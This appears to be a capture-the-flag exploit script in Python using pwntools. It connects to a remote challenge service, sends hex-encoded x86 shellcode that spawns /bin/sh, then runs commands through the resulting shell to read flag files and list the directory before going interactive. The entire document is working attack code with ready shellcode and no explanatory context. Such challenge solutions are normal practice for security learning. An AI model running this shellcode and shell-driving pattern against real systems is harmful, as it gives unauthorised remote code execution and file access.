#!/usr/bin/env python3
from pwn import *

payload = "b85570330180008d40800040682f736800682f62696e89e3b80b000000b900000000ba00000000e9240000004048404840484048404840484048404840484048404840484048404840484048404840484040ebfe"

print("[*] Connecting to amt.rs:57207...")
io = remote('amt.rs', 57207)

print("[*] Sending shellcode...")
io.sendlineafter(b'shellcode: ', payload.encode())

print("[*] Got shell! Trying to cat flag...")
sleep(0.5)

# Send a command and wait for output
io.sendline(b'cat flag')
sleep(0.5)
io.sendline(b'cat /srv/app/flag')
sleep(0.5)
io.sendline(b'ls -la')
sleep(0.5)

print("[*] Receiving output...")
try:
    output = io.recv(timeout=3)
    if output:
        print("\n" + "="*60)
        print("RECEIVED:")
        print("="*60)
        print(output.decode(errors='ignore'))
        print("="*60)
    else:
        print("No output received")
except Exception as e:
    print(f"Error receiving: {e}")

print("\n[*] Switching to interactive mode...")
io.interactive()
